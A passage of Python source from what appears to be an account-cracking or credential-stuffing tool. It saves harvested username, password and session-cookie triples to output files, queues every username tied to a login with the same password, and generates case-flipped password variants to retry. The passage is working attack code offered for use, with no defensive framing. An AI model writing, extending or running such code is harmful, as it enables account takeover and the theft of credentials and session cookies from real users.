                        file.write(f"{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}")
            else:
                with self.lock.get_lock():
                    with open("output/temp_banned.txt", "a", encoding="utf-8") as file:
                        file.write(f"{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}")
        
        DEBUG and Output("INFO").log("Done")

    def handle_multi(self, user_id_and_cookie) -> None:
        multiple_accounts = loads(user_id_and_cookie["errors"][0]["fieldData"])["users"]

        for multiple_account in multiple_accounts:
            account_string = f"{multiple_account.get('name')}:{self.account[1]}:{self.account[0]}\n"
            self.accounts.insert(self.counter.get_value() + 1, account_string)

        if self.account[1].isupper():
            new_password = self.account[1].lower()
        else:
            match = re.search(r'[A-Za-z]', self.account[1])
            if match:
                index = match.start()
                new_password = (
                    self.account[1][:index] + self.account[1][index].swapcase() + self.account[1][index+1:]
                )
            else:
                new_password = self.account[1]

        combo = f'{self.account[0]}:{new_password}'
        self.accounts.insert(self.counter.get_value() + 1, combo + '\n')